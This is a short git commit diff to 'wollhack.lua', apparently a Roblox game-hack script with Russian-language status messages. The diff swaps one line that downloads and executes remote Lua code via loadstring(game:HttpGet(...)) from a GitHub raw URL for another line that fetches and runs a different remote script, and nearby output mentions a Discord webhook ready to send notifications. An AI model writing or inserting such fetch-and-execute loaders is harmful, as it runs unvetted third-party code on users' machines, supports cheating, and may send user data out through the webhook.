eb3ffc56d2548c6d18b9d768c38d8a0e02d8be4a
ldkoedkeo <oo391507@gmail.com>
2025-11-18 16:43:40 +0500

    Update wollhack.lua

--- whespwollhock/wollhack.lua
+++ whespwollhock/wollhack.lua
@@ -560,7 +560,6 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         scanAndNotify()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ldkoedkeo/eblan2222/refs/heads/main/noob.lua"))()
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
